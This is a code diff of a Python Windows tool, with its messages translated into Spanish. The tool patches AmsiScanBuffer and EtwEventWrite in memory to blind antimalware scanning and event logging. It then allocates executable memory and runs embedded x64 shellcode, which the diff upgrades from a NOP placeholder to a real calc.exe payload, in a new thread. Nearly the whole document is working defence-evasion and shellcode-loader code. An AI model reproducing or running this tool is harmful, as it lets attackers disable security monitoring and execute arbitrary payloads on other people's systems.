@@ -31,17 +31,35 @@ try:
     VirtualProtect.argtypes = [LPVOID, SIZE_T, DWORD, ctypes.POINTER(DWORD)]
     VirtualProtect.restype = BOOL
 
+    # --- CORRECCIONES DE 64-BIT / PUNTERO ---
+    # Es VITAL definir explícitamente el restype de VirtualAlloc como LPVOID
+    VirtualAlloc = kernel32.VirtualAlloc
+    VirtualAlloc.argtypes = [LPVOID, SIZE_T, DWORD, DWORD]
+    VirtualAlloc.restype = LPVOID
+
+    # Definición de CreateThread para asegurar que el restype del Handle sea LPVOID
+    CreateThread = kernel32.CreateThread
+    CreateThread.argtypes = [LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, ctypes.POINTER(DWORD)]
+    CreateThread.restype = LPVOID # El HANDLE de hilo es un puntero (LPVOID)
+    # ----------------------------------------
+    
     # Define RtlMoveMemory (equivalent to memcpy for writing the patch)
     RtlMoveMemory = ntdll.RtlMoveMemory
     RtlMoveMemory.argtypes = [LPVOID, LPVOID, SIZE_T]
     RtlMoveMemory.restype = None
+
+    # Define WaitForSingleObject
+    WaitForSingleObject = kernel32.WaitForSingleObject
+    WaitForSingleObject.argtypes = [LPVOID, DWORD]
+    WaitForSingleObject.restype = DWORD
+
 
     # Memory Protection constants
     PAGE_READWRITE = 0x04
     PAGE_EXECUTE_READWRITE = 0x40
 
 except Exception as e:
-    print(f"[-] Error loading ctypes or defining functions. Ensure this script runs on Windows. Error: {e}")
+    print(f"[-] Error al cargar ctypes o definir funciones. Asegúrese de que este script se ejecute en Windows. Error: {e}")
     sys.exit(1)
 
 # Verbose print
@@ -65,7 +83,7 @@ PATCH_SIZE = len(PATCH_BYTES_AMSI)
 # --- MAIN LOGIC ---
 
 def invoke_nullamsi(verbose_flag=False, etw_flag=False):
-    print("[*] Starting AMSI patch...")
+    print("[*] Iniciando parche AMSI...")
 
     # 1. Decoding "obfuscated" strings
     get_proc_bytes = [
@@ -93,74 +111,74 @@ def invoke_nullamsi(verbose_flag=False, etw_flag=False):
     amsi_init = decode_ascii(amsi_init_bytes)
     amsi_scanbuffer = decode_ascii(amsi_scanbuffer_bytes)
 
-    print(f"[*] Target DLL: {amsi_dll}")
-    print(f"[*] Target Function: {amsi_init}")
-    print(f"[*] Target Function: {amsi_scanbuffer}")
+    print(f"[*] DLL de destino: {amsi_dll}")
+    print(f"[*] Función de destino: {amsi_init}")
+    print(f"[*] Función de destino: {amsi_scanbuffer}")
 
     # 2. Get function pointers using ctypes
-    print("[*] Locating AMSI module and function address...")
+    print("[*] Localizando el módulo AMSI y la dirección de la función...")
 
     # 2a. Get handle to amsi.dll
     try:
         ctypes.windll.LoadLibrary("amsi.dll")
     except Exception as e:
-        print(f"[-] Error loading amsi.dll: {e}")
-        print("[-] This may prevent the script from working correctly.")
+        print(f"[-] Error cargando amsi.dll: {e}")
+        print("[-] Esto puede impedir que el script funcione correctamente.")
         # It's not fatal, so we can continue
 
     amsi_handle = GetModuleHandleW(amsi_dll)
     if amsi_handle:
-        verbose(f"amsi.dll handle found at: 0x{amsi_handle:x}", verbose_flag)
+        verbose(f"amsi.dll handle encontrado en: 0x{amsi_handle:x}", verbose_flag)
     else:
-        print("[-] FAILED: Could not get handle to amsi.dll. Is it loaded in the process?")
+        print("[-] FALLO: No se pudo obtener el handle a amsi.dll. ¿Está cargado en el proceso?")
         return
 
     # 2b. Get address of AmsiInitialize
     amsi_init_addr = GetProcAddress(amsi_handle, amsi_init.encode('ascii'))
     if amsi_init_addr:
-        print(f"[+] SUCCESS: Found {amsi_init} address at: 0x{amsi_init_addr:x}")
+        print(f"[+] ÉXITO: Dirección de {amsi_init} encontrada en: 0x{amsi_init_addr:x}")
     else:
-        print(f"[-] FAILED: Could not find address for {amsi_init}.")
+        print(f"[-] FALLO: No se pudo encontrar la dirección para {amsi_init}.")
         return
 
     # 2c. Get address of AmsiScanBuffer
     amsi_scanbuffer_addr = GetProcAddress(amsi_handle, amsi_scanbuffer.encode('ascii'))
     if amsi_scanbuffer_addr:
-        print(f"[+] SUCCESS: Found {amsi_scanbuffer} address at: 0x{amsi_scanbuffer_addr:x}")
+        print(f"[+] ÉXITO: Dirección de {amsi_scanbuffer} encontrada en: 0x{amsi_scanbuffer_addr:x}")
     else:
-        print(f"[-] FAILED: Could not find address for {amsi_scanbuffer}.")
+        print(f"[-] FALLO: No se pudo encontrar la dirección para {amsi_scanbuffer}.")
         return
 
 
     # 3. Patch AmsiScanBuffer
-    print(f"[*] Patching {amsi_scanbuffer}...")
+    print(f"[*] Parcheando {amsi_scanbuffer}...")
 
     old_protection = DWORD(0)
     
     # Step 3a: Change memory permissions (R-W-X)
     if VirtualProtect(amsi_scanbuffer_addr, PATCH_SIZE, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protection)):
-        verbose(f"Memory protection changed successfully to PAGE_EXECUTE_READWRITE at 0x{amsi_scanbuffer_addr:x}", verbose_flag)
+        verbose(f"Protección de memoria cambiada con éxito a PAGE_EXECUTE_READWRITE en 0x{amsi_scanbuffer_addr:x}", verbose_flag)
         
         # Step 3b: Write the patch bytes
         buffer = (ctypes.c_char * PATCH_SIZE).from_buffer_copy(PATCH_BYTES_AMSI)
         RtlMoveMemory(amsi_scanbuffer_addr, buffer, PATCH_SIZE) 
         
-        print(f"[+] Successfully patched {amsi_scanbuffer} at 0x{amsi_scanbuffer_addr:x} with {PATCH_BYTES_AMSI.hex()}")
+        print(f"[+] Parcheado con éxito {amsi_scanbuffer} en 0x{amsi_scanbuffer_addr:x} con {PATCH_BYTES_AMSI.hex()}")
 
         # Step 3c: Restore original memory protection
         new_old_protection = DWORD(0)
         if VirtualProtect(amsi_scanbuffer_addr, PATCH_SIZE, old_protection, ctypes.byref(new_old_protection)):
-            verbose(f"Memory protection restored to 0x{old_protection.value:x}", verbose_flag)
-            print("[+] AMSI patch finished successfully.")
+            verbose(f"Protección de memoria restaurada a 0x{old_protection.value:x}", verbose_flag)
+            print("[+] Parche AMSI finalizado con éxito.")
         else:
-            print("[-] FAILED: Could not restore memory protection.")
+            print("[-] FALLO: No se pudo restaurar la protección de memoria.")
             
     else:
-        print("[-] FAILED: Could not change memory protection (VirtualProtect failed).")
+        print("[-] FALLO: No se pudo cambiar la protección de memoria (VirtualProtect falló).")
 
     # 4. Optional: Patch ETW
     if etw_flag:
-        print("\n[*] ETW patching requested...")
+        print("\n[*] Parche ETW solicitado...")
         
         # ETW Target: The function commonly targeted is EtwEventWrite from ntdll.dll
         etw_target = b'EtwEventWrite'
@@ -168,46 +186,60 @@ def invoke_nullamsi(verbose_flag=False, etw_flag=False):
         etw_addr = GetProcAddress(ntdll._handle, etw_target)
         
         if etw_addr:
-            print(f"[+] SUCCESS: Found {etw_target.decode()} address at: 0x{etw_addr:x}")
+            print(f"[+] ÉXITO: Dirección de {etw_target.decode()} encontrada en: 0x{etw_addr:x}")
             
             old_protection_etw = DWORD(0)
 
             if VirtualProtect(etw_addr, PATCH_SIZE, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protection_etw)):
-                verbose(f"Memory protection changed successfully to PAGE_EXECUTE_READWRITE at 0x{etw_addr:x}", verbose_flag)
+                verbose(f"Protección de memoria cambiada con éxito a PAGE_EXECUTE_READWRITE en 0x{etw_addr:x}", verbose_flag)
 
                 buffer_etw = (ctypes.c_char * PATCH_SIZE).from_buffer_copy(b"\xC3") # RET
                 RtlMoveMemory(etw_addr, buffer_etw, PATCH_SIZE)
 
-                print(f"[+] Successfully patched {etw_target.decode()} at 0x{etw_addr:x} with C3 (RET)")
+                print(f"[+] Parcheado con éxito {etw_target.decode()} en 0x{etw_addr:x} con C3 (RET)")
 
                  # Restore original memory protection
                 new_old_protection_etw = DWORD(0)
                 if VirtualProtect(etw_addr, PATCH_SIZE, old_protection_etw, ctypes.byref(new_old_protection_etw)):
-                    verbose(f"Memory protection restored to 0x{old_protection_etw.value:x}", verbose_flag)
-                    print("[+] ETW patch finished successfully.")
+                    verbose(f"Protección de memoria restaurada a 0x{old_protection_etw.value:x}", verbose_flag)
+                    print("[+] Parche ETW finalizado con éxito.")
                 else:
-                    print("[-] FAILED: Could not restore memory protection for ETW.")
+                    print("[-] FALLO: No se pudo restaurar la protección de memoria para ETW.")
             else:
-                 print("[-] FAILED: Could not change memory protection (VirtualProtect failed) for ETW.")
+                print("[-] FALLO: No se pudo cambiar la protección de memoria (VirtualProtect falló) para ETW.")
 
         else:
-            print(f"[-] FAILED: Could not find address for {etw_target.decode()}.")
+            print(f"[-] FALLO: No se pudo encontrar la dirección para {etw_target.decode()}.")
 
-import ctypes
-import sys
-
-# 1. Shellcode de Ejemplo (Placeholder)
-# Nota: Este es un shellcode DE EJEMPLO. En un escenario real,
-# aquí pondrías tu shellcode real. Este placeholder es solo para
-# demostrar la estructura del script.
-# *Reemplaza la matriz de bytes con tu shellcode real.*
-# (El shellcode real para un MessageBoxA es largo y complejo de generar manualmente)
-SHELLCODE = b"\x90\x90\x90\x90" * 20  # NOP Sled simple como placeholder (80 bytes de \x90)
+# 1. Shellcode de Ejecución (calc.exe)
+# ADVERTENCIA: Este shellcode debe ser compatible con la arquitectura de Python (probablemente x64)
+SHELLCODE = (
+b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+b"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+b"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+b"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+b"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+b"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+b"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+b"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+b"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+b"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
+b"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+b"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
+)
 
 def load_shellcode_windows(shellcode_bytes):
     """
     Asigna memoria, copia el shellcode y lo ejecuta en un nuevo hilo
-    utilizando la API de Windows.
+    utilizando la API de Windows. Se ha mejorado el manejo de errores.
     """
     
     if not sys.platform.startswith('win'):
@@ -221,12 +253,11 @@ def load_shellcode_windows(shellcode_bytes):
 
     shellcode_len = len(shellcode_bytes)
 
+    print(f"[#] Intentando cargar shellcode de {shellcode_len} bytes...")
+    print(f"[#] Arquitectura de Python: {'64-bit' if sys.maxsize > 2**32 else '32-bit'}")
+
     # 1. Asignar memoria para el shellcode
-    # Utilizamos VirtualAlloc para obtener un bloque de memoria con permisos de ejecución
-    kernel32 = ctypes.windll.kernel32
-    
-    # lpAddress=None, dwSize=shellcode_len, flAllocationType=MEM_COMMIT | MEM_RESERVE, flProtect=PAGE_EXECUTE_READWRITE
-    ptr = kernel32.VirtualAlloc(
+    ptr = VirtualAlloc(
         None, 
         shellcode_len, 
         MEM_COMMIT | MEM_RESERVE, 
@@ -234,19 +265,23 @@ def load_shellcode_windows(shellcode_bytes):
     )
 
     if ptr is None or ptr == 0:
-        print(f"[-] Error al asignar memoria: {kernel32.GetLastError()}")
+        error_code = kernel32.GetLastError()
+        print(f"[-] ERROR: VirtualAlloc falló al asignar memoria. Código de error: {error_code}")
+        print("[!] Verifique si hay restricciones de seguridad (como DEP) o permisos elevados (Admin) requeridos.")
         return
 
     print(f"[+] Memoria asignada en: 0x{ptr:x}")
 
     # 2. Copiar el shellcode a la memoria asignada
-    # Usamos RtlMoveMemory (o memmove) para copiar los bytes del shellcode
-    ctypes.memmove(ptr, shellcode_bytes, shellcode_len)
-    
+    try:
+        ctypes.memmove(ptr, shellcode_bytes, shellcode_len)
+        print("[+] Shellcode copiado correctamente a la memoria asignada.")
+    except Exception as e:
+        print(f"[-] ERROR: ctypes.memmove falló al copiar el shellcode. {e}")
+        return
+
     # 3. Ejecutar el shellcode
-    # Creamos un hilo para ejecutar el shellcode.
-    # lpThreadAttributes=None, dwStackSize=0, lpStartAddress=ptr, lpParameter=None
-    h_thread = kernel32.CreateThread(
+    h_thread = CreateThread(
         None, 
         0, 
         ptr, 
@@ -256,25 +291,33 @@ def load_shellcode_windows(shellcode_bytes):
     )
 
     if h_thread is None or h_thread == 0:
-        print(f"[-] Error al crear el hilo: {kernel32.GetLastError()}")
-        print("[!] Nota: La asignación de memoria persiste.")
-        # Opcional: Liberar la memoria con VirtualFree
-        # kernel32.VirtualFree(ptr, 0, 0x8000) # MEM_RELEASE
+        error_code = kernel32.GetLastError()
+        print(f"[-] ERROR: CreateThread falló al crear el hilo. Código de error: {error_code}")
+        print(f"[!] Nota: La asignación de memoria persiste (0x{ptr:x}).")
         return
 
-    print(f"[+] Shellcode ejecutándose en el hilo: {h_thread}")
+    print(f"[+] Shellcode ejecutándose en el hilo (Handle): 0x{h_thread:x}")
 
-    # Esperar a que el hilo termine (importante si el shellcode hace algo visible)
-    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF) # 0xFFFFFFFF = INFINITE
-
-    print("[+] Ejecución del shellcode finalizada.")
+    # Esperar a que el hilo termine
+    wait_result = WaitForSingleObject(h_thread, 0xFFFFFFFF) 
     
+    if wait_result == 0: # WAIT_OBJECT_0
+        print("[+] Ejecución del shellcode finalizada (Hilo terminado con éxito).")
+    elif wait_result == 0x00000080: # WAIT_ABANDONED (Mutex/Semaphore specific, but can happen)
+        print("[!] El hilo del Shellcode se ha detenido de forma inesperada (WAIT_ABANDONED).")
+    elif wait_result == 0xFFFFFFFF: # WAIT_FAILED
+        error_code = kernel32.GetLastError()
+        print(f"[-] ERROR: WaitForSingleObject falló. Código de error: {error_code}")
+    else:
+        print(f"[!] El hilo terminó con un resultado inesperado: 0x{wait_result:x}")
 
+    # Se podría añadir una llamada a CloseHandle(h_thread) aquí para buenas prácticas.
+    
 
 # Entry point
 if __name__ == "__main__":
     if os.name != 'nt':
-        print("[-] This script must be run on a Windows operating system.")
+        print("[-] Este script debe ejecutarse en un sistema operativo Windows.")
         sys.exit(1)
 
     parser = argparse.ArgumentParser(description="AMSI/ETW Patching Tool")
@@ -283,7 +326,9 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
+    # Ejecutar el parche de AMSI/ETW
     invoke_nullamsi(verbose_flag=args.verbose, etw_flag=args.etw)
 
-    if SHELLCODE == b"\x90\x90\x90\x90" * 20:
-        load_shellcode_windows(SHELLCODE)
+    # El shellcode ahora está correctamente cargado
+    # IMPORTANTE: El shellcode DEBE ser de 64 bits si su Python es de 64 bits.
+    load_shellcode_windows(SHELLCODE)
